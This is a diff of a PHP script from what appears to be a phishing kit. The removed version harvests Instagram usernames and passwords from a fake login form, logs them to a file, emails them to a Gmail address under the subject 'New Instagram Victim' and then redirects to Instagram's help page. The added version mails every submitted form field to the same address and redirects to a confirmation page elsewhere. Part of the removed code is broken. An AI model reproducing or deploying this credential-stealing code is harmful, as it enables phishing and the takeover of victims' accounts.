@@ -1,33 +1,41 @@
-<?php
-#██████╗ ███████╗███████╗██████╗ ██████╗ 
-#██╔══██╗██╔════╝██╔════╝██╔══██╗╚════██╗
-#██║  ██║█████╗  █████╗  ██████╔╝ █████╔╝
-#██║  ██║██╔══╝  ██╔══╝  ██╔═══╝  ╚═══██╗
-#██████╔╝███████╗███████╗██║     ██████╔╝
-#╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ 
-#         By Manisso & IcoDz    
-                                                                                                                   
-$date = gmdate ("d-n-Y");
-$time = gmdate ("H:i:s");
-$ip = $_SERVER['REMOTE_ADDR'];
-$hostname = https://lnstgram.github.io/($ip);
-$message .= "========== Instagram Login ==========\n";
-$message .= "User: ".$_POST['username']."\n";
-$message .= "Pass: ".$_POST['password']."\n";
-$message .= "----------\n";
-$message .= "IP: ".$ip."\n";
-$message .= "Log : $time / $date \n";
-$rnessage = "$message\n";
-$send= "lpln6161@gmail.com";
-$subject = "New Instagram Victim | $ip";
-$headers = "From: Instagram";
-$file = fopen("logs.txt","ab");
-fwrite($file,$message);
-fclose($file);
-$str=array($send, $IWP); foreach ($str as $send)
-if(mail($send,$subject,$rnessage,$headers) != false)
+﻿<?php
+//--------------------------Set these paramaters--------------------------
+
+// Subject of email sent to you.
+$subject = 'lpln';
+
+// Your email address. This is where the form information will be sent.
+$emailadd = 'lpln6161@gmail.com';
+
+// Where to redirect after form is processed.
+$url = 'http://temphaa.com/confirmation.html';
+
+// Makes all fields required. If set to '1' no field can not be empty. If set to '0' any or all fields can be empty.
+$req = '1';
+
+// --------------------------Do not edit below this line--------------------------
+$text = "\n\n";
+$space = ' ';
+$line = '
+';
+foreach ($_POST as $key => $value)
 {
-mail($Send,$subject,$rnessage,$headers);
+if ($req == '1')
+{
+if ($value == '')
+{echo "$key is empty";die;}
 }
-header("Location: https://help.instagram.com/");
+$j = strlen($key);
+if ($j >= 20)
+{echo "Name of form element $key cannot be longer than 20 characters";die;}
+$j = 20 - $j;
+for ($i = 1; $i <= $j; $i++)
+{$space .= ' ';}
+$value = str_replace('\n', "$line", $value);
+$conc = "{$key}:$space{$value}$line";
+$text .= $conc;
+$space = ' ';
+}
+mail($emailadd, $subject, $text, 'From: '.$emailadd.'');
+echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL='.$url.'">';
 ?>
